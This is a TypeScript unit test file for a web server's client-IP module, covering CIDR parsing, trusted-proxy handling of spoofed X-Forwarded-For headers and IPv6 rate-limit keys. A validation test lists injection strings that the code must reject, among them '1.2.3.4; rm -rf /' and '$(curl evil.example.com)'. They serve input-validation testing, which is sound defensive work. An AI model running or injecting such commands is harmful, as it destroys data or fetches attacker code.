/**
 * Unit tests for client-ip.ts (S-H1 trusted-proxy logic).
 *
 * Tests run without a live Bun.serve instance, so getConnInfo will throw.
 * We test getTrustedClientIp by setting c.get("peerIp") on a mock context,
 * which the implementation reads as its Plan B fallback.
 */

import { afterEach, beforeEach, describe, expect, spyOn, test } from "bun:test";
import {
	TRUSTED_PROXY_CHECK_SAMPLES,
	_resetTrustedProxyCheckForTest,
	getTrustedClientIp,
	isTrustedProxy,
	isValidIp,
	parseCidrList,
	rateLimitKeyForIp,
} from "./client-ip.js";
import type { ParsedCidr } from "./client-ip.js";

// ── CIDR / isTrustedProxy tests ──────────────────────────────────────────────

describe("parseCidrList", () => {
	test("empty string returns empty array", () => {
		expect(parseCidrList("")).toHaveLength(0);
		expect(parseCidrList("   ")).toHaveLength(0);
	});

	test("single host /32", () => {
		const cidrs = parseCidrList("10.0.0.1");
		expect(cidrs).toHaveLength(1);
		expect(cidrs[0]).toBeDefined();
	});

	test("CIDR block 10.0.0.0/8", () => {
		const cidrs = parseCidrList("10.0.0.0/8");
		expect(cidrs).toHaveLength(1);
	});

	test("multiple CIDRs comma-separated", () => {
		const cidrs = parseCidrList("10.0.0.0/8, 172.16.0.0/12");
		expect(cidrs).toHaveLength(2);
	});

	test("invalid entry is skipped gracefully", () => {
		const cidrs = parseCidrList("notanip, 10.0.0.0/8");
		expect(cidrs).toHaveLength(1);
	});
});

describe("isValidIp", () => {
	test("valid IPv4", () => {
		expect(isValidIp("1.2.3.4")).toBe(true);
		expect(isValidIp("0.0.0.0")).toBe(true);
		expect(isValidIp("255.255.255.255")).toBe(true);
	});

	test("invalid IPv4", () => {
		expect(isValidIp("256.0.0.1")).toBe(false);
		expect(isValidIp("not-an-ip")).toBe(false);
		expect(isValidIp("")).toBe(false);
	});

	test("IPv6 passes through as valid", () => {
		expect(isValidIp("::1")).toBe(true);
		expect(isValidIp("2001:db8::1")).toBe(true);
	});

	// L5: reject XFF values containing shell metacharacters or injection payloads.
	test("rejects strings with shell metacharacters (L5)", () => {
		expect(isValidIp("1.2.3.4; rm -rf /")).toBe(false);
		expect(isValidIp("1.2.3.4|evil")).toBe(false);
		expect(isValidIp("$(curl evil.example.com)")).toBe(false);
		expect(isValidIp("1.2.3.4\n5.6.7.8")).toBe(false);
		expect(isValidIp("1.2.3.4 5.6.7.8")).toBe(false);
	});
});

describe("isTrustedProxy", () => {
	const cidrs10: ParsedCidr[] = parseCidrList("10.0.0.0/8");
	const cidrs172: ParsedCidr[] = parseCidrList("172.16.0.0/12");

	test("IP inside 10.0.0.0/8 is trusted", () => {
		expect(isTrustedProxy("10.42.0.1", cidrs10)).toBe(true);
		expect(isTrustedProxy("10.0.0.1", cidrs10)).toBe(true);
		expect(isTrustedProxy("10.255.255.255", cidrs10)).toBe(true);
	});

	test("IP outside 10.0.0.0/8 is not trusted", () => {
		expect(isTrustedProxy("192.168.1.1", cidrs10)).toBe(false);
		expect(isTrustedProxy("11.0.0.1", cidrs10)).toBe(false);
	});

	test("172.16.0.0/12 range", () => {
		expect(isTrustedProxy("172.16.0.1", cidrs172)).toBe(true);
		expect(isTrustedProxy("172.31.255.255", cidrs172)).toBe(true);
		expect(isTrustedProxy("172.32.0.0", cidrs172)).toBe(false);
	});

	test("IPv6 peer never matches IPv4 CIDR", () => {
		expect(isTrustedProxy("::1", cidrs10)).toBe(false);
		expect(isTrustedProxy("2001:db8::1", cidrs10)).toBe(false);
	});

	// L3: IPv4-mapped IPv6 addresses (::ffff:x.y.z.w) must match their embedded
	// IPv4 address against trusted CIDRs so that a Traefik pod presenting the
	// mapped form is still recognised as a trusted proxy.
	test("IPv4-mapped IPv6 (::ffff:x.y.z.w) matches the embedded IPv4 CIDR (L3)", () => {
		expect(isTrustedProxy("::ffff:10.42.0.1", cidrs10)).toBe(true);
		expect(isTrustedProxy("::FFFF:10.0.0.1", cidrs10)).toBe(true);
		expect(isTrustedProxy("::ffff:192.168.1.1", cidrs10)).toBe(false); // outside /8
	});

	test("empty CIDR list — nothing trusted", () => {
		expect(isTrustedProxy("10.0.0.1", [])).toBe(false);
	});
});

// ── getTrustedClientIp tests ─────────────────────────────────────────────────
//
// We cannot call getConnInfo without a live Bun server, so we build a minimal
// mock Hono Context that exposes get/set/req.header and triggers the fallback
// path in getTrustedClientIp (the try/catch catches the missing-server error
// and reads peerIp from context instead).

function makeCtx(
	peerIp: string,
	xff?: string,
	xForwardedFor?: string,
): Parameters<typeof getTrustedClientIp>[0] {
	const store = new Map<string, unknown>([["peerIp", peerIp]]);
	const headers: Record<string, string> = {};
	if (xff) headers["x-forwarded-for"] = xff;
	if (xForwardedFor) headers["x-forwarded-for"] = xForwardedFor;

	return {
		get: (key: string) => store.get(key),
		set: (key: string, value: unknown) => store.set(key, value),
		req: {
			header: (name: string) => headers[name.toLowerCase()] ?? null,
		},
		env: {}, // no server handle → getConnInfo will throw → fallback to peerIp
	} as unknown as Parameters<typeof getTrustedClientIp>[0];
}

const originalTrustedProxies = process.env.AGENTPULSE_TRUSTED_PROXIES;

beforeEach(() => {
	process.env.AGENTPULSE_TRUSTED_PROXIES = undefined;
});

afterEach(() => {
	if (originalTrustedProxies !== undefined) {
		process.env.AGENTPULSE_TRUSTED_PROXIES = originalTrustedProxies;
	} else {
		process.env.AGENTPULSE_TRUSTED_PROXIES = undefined;
	}
});

describe("getTrustedClientIp — no trusted proxies configured (default)", () => {
	test("returns the TCP peer IP even if XFF is present (spoofed XFF is ignored)", () => {
		const ctx = makeCtx("203.0.113.5", "1.1.1.1");
		const ip = getTrustedClientIp(ctx);
		expect(ip).toBe("203.0.113.5");
	});

	test("returns the TCP peer IP when no XFF present", () => {
		const ctx = makeCtx("203.0.113.5");
		const ip = getTrustedClientIp(ctx);
		expect(ip).toBe("203.0.113.5");
	});

	test("never returns undefined or empty string", () => {
		const ctx = makeCtx("10.42.0.1");
		const ip = getTrustedClientIp(ctx);
		expect(ip).toBeTruthy();
		expect(typeof ip).toBe("string");
	});
});

describe("getTrustedClientIp — with trusted proxies", () => {
	test("honors XFF leftmost IP when peer is in trusted CIDR", () => {
		process.env.AGENTPULSE_TRUSTED_PROXIES = "10.0.0.0/8";
		const ctx = makeCtx("10.42.0.1", "203.0.113.5, 10.42.0.1");
		const ip = getTrustedClientIp(ctx);
		expect(ip).toBe("203.0.113.5");
	});

	test("ignores XFF when peer is outside trusted CIDR (spoof attempt)", () => {
		process.env.AGENTPULSE_TRUSTED_PROXIES = "10.0.0.0/8";
		// Attacker at 1.1.1.1 forges XFF to appear as 203.0.113.5
		const ctx = makeCtx("1.1.1.1", "203.0.113.5");
		const ip = getTrustedClientIp(ctx);
		// Must return the actual TCP peer, not the forged XFF value.
		expect(ip).toBe("1.1.1.1");
	});

	test("spoof test: two requests with same XFF from different TCP peers get distinct buckets", () => {
		// This test proves that the bucket key uses the TCP peer, not the XFF,
		// so two attackers from different IPs cannot share a rate-limit bucket.
		process.env.AGENTPULSE_TRUSTED_PROXIES = ""; // no proxies trusted
		const xff = "203.0.113.5"; // both forging the same XFF
		const ctx1 = makeCtx("1.2.3.4", xff);
		const ctx2 = makeCtx("5.6.7.8", xff);
		expect(getTrustedClientIp(ctx1)).toBe("1.2.3.4");
		expect(getTrustedClientIp(ctx2)).toBe("5.6.7.8");
	});

	test("legitimate forward from trusted proxy: same client gets same IP behind proxy", () => {
		process.env.AGENTPULSE_TRUSTED_PROXIES = "10.0.0.0/8";
		// Two requests from the same real client through the same Traefik pod
		const ctx1 = makeCtx("10.42.0.1", "203.0.113.99");
		const ctx2 = makeCtx("10.42.0.1", "203.0.113.99");
		expect(getTrustedClientIp(ctx1)).toBe("203.0.113.99");
		expect(getTrustedClientIp(ctx2)).toBe("203.0.113.99");
	});

	test("different clients behind same trusted proxy get distinct IPs", () => {
		process.env.AGENTPULSE_TRUSTED_PROXIES = "10.0.0.0/8";
		const ctx1 = makeCtx("10.42.0.1", "203.0.113.1");
		const ctx2 = makeCtx("10.42.0.1", "203.0.113.2");
		expect(getTrustedClientIp(ctx1)).toBe("203.0.113.1");
		expect(getTrustedClientIp(ctx2)).toBe("203.0.113.2");
	});
});

describe("rateLimitKeyForIp", () => {
	const table: Array<[string, string, string]> = [
		["IPv4 is itself", "203.0.113.9", "203.0.113.9"],
		["IPv4-mapped IPv6 is the IPv4 address", "::ffff:203.0.113.9", "203.0.113.9"],
		["IPv6 is its /64", "2001:db8:1:2:3:4:5:6", "2001:0db8:0001:0002::/64"],
		["compression expands", "2001:db8:1:2::1", "2001:0db8:0001:0002::/64"],
		[
			"the same /64, a different host part",
			"2001:db8:1:2:ffff:eeee:dddd:cccc",
			"2001:0db8:0001:0002::/64",
		],
		[
			"upper case and leading zeros are one address",
			"2001:0DB8:0001:0002::7",
			"2001:0db8:0001:0002::/64",
		],
		["brackets and a zone are dropped", "[2001:db8:1:2::1%eth0]", "2001:0db8:0001:0002::/64"],
		["a different /64 is a different key", "2001:db8:1:3::1", "2001:0db8:0001:0003::/64"],
		["compression inside the first 64 bits", "2001:db8::5", "2001:0db8:0000:0000::/64"],
		["the loopback", "::1", "0000:0000:0000:0000::/64"],
		["the unspecified address", "::", "0000:0000:0000:0000::/64"],
		["something that isn't an address is its own key", "not-an-ip", "not-an-ip"],
		["too many groups is its own key", "1:2:3:4:5:6:7:8:9", "1:2:3:4:5:6:7:8:9"],
		["two compressions is its own key", "1::2::3", "1::2::3"],
		["a group that isn't hex is its own key", "2001:db8:xyz::1", "2001:db8:xyz::1"],
	];
	for (const [name, input, expected] of table) {
		test(name, () => expect(rateLimitKeyForIp(input)).toBe(expected));
	}
});

describe("the trusted-proxy setup check", () => {
	const saved = process.env.AGENTPULSE_TRUSTED_PROXIES;
	beforeEach(() => _resetTrustedProxyCheckForTest());
	afterEach(() => {
		if (saved === undefined) process.env.AGENTPULSE_TRUSTED_PROXIES = undefined;
		else process.env.AGENTPULSE_TRUSTED_PROXIES = saved;
	});

	function ctx(peer: string, xff?: string) {
		return {
			get: (key: string) => (key === "peerIp" ? peer : undefined),
			req: { header: (name: string) => (name === "X-Forwarded-For" ? xff : undefined) },
			// biome-ignore lint/suspicious/noExplicitAny: a minimal Hono context stand-in
		} as any;
	}
	function warnings(run: () => void): Array<Record<string, unknown>> {
		const spy = spyOn(console, "warn").mockImplementation(() => undefined);
		try {
			run();
			return spy.mock.calls.map((call) => JSON.parse(String(call[0])));
		} finally {
			spy.mockRestore();
		}
	}
	const unverified = (list: Array<Record<string, unknown>>) =>
		list.filter((w) => w.kind === "trusted_proxies_unverified");

	test("nothing is checked when no proxies are configured", () => {
		process.env.AGENTPULSE_TRUSTED_PROXIES = undefined;
		const out = warnings(() => {
			for (let i = 0; i < TRUSTED_PROXY_CHECK_SAMPLES * 2; i++)
				getTrustedClientIp(ctx("203.0.113.20"));
		});
		expect(out).toEqual([]);
	});

	test("peers outside the range: one warning after the sample size, saying the range is wrong", () => {
		process.env.AGENTPULSE_TRUSTED_PROXIES = "192.0.2.0/24";
		const out = unverified(
			warnings(() => {
				for (let i = 0; i < TRUSTED_PROXY_CHECK_SAMPLES * 2; i++)
					getTrustedClientIp(ctx("203.0.113.9", "198.51.100.1"));
			}),
		);
		expect(out).toHaveLength(1);
		expect(out[0]?.trustedPeers).toBe(0);
		expect(String(out[0]?.detail)).toContain("range");
	});

	test("trusted peers that never forward the address: one warning saying so", () => {
		process.env.AGENTPULSE_TRUSTED_PROXIES = "192.0.2.0/24";
		const out = unverified(
			warnings(() => {
				for (let i = 0; i < TRUSTED_PROXY_CHECK_SAMPLES; i++) getTrustedClientIp(ctx("192.0.2.5"));
			}),
		);
		expect(out).toHaveLength(1);
		expect(out[0]?.trustedPeers).toBe(TRUSTED_PROXY_CHECK_SAMPLES);
		expect(String(out[0]?.detail)).toContain("X-Forwarded-For");
	});

	test("one trusted peer that forwards ends the check: no warning, however many requests follow", () => {
		process.env.AGENTPULSE_TRUSTED_PROXIES = "192.0.2.0/24";
		const out = unverified(
			warnings(() => {
				getTrustedClientIp(ctx("192.0.2.5", "198.51.100.1"));
				for (let i = 0; i < TRUSTED_PROXY_CHECK_SAMPLES * 3; i++)
					getTrustedClientIp(ctx("203.0.113.9"));
			}),
		);
		expect(out).toEqual([]);
	});

	test("loopback requests (internal probes) are not counted", () => {
		process.env.AGENTPULSE_TRUSTED_PROXIES = "192.0.2.0/24";
		const out = unverified(
			warnings(() => {
				for (let i = 0; i < TRUSTED_PROXY_CHECK_SAMPLES * 2; i++)
					getTrustedClientIp(ctx("127.0.0.1"));
			}),
		);
		expect(out).toEqual([]);
	});

	test("a value that holds no CIDR (an unreplaced placeholder) is reported once and ignored", () => {
		process.env.AGENTPULSE_TRUSTED_PROXIES = "<ingress-pod-cidr>";
		const out = warnings(() => {
			for (let i = 0; i < 5; i++) {
				expect(getTrustedClientIp(ctx("203.0.113.9", "198.51.100.1"))).toBe("203.0.113.9");
			}
		});
		expect(out.filter((w) => w.kind === "trusted_proxies_invalid")).toHaveLength(1);
	});

	test("the client address is unchanged by the check", () => {
		process.env.AGENTPULSE_TRUSTED_PROXIES = "192.0.2.0/24";
		warnings(() => {
			expect(getTrustedClientIp(ctx("192.0.2.5", "198.51.100.1, 192.0.2.5"))).toBe("198.51.100.1");
			expect(getTrustedClientIp(ctx("203.0.113.9", "198.51.100.1"))).toBe("203.0.113.9");
		});
	});
});
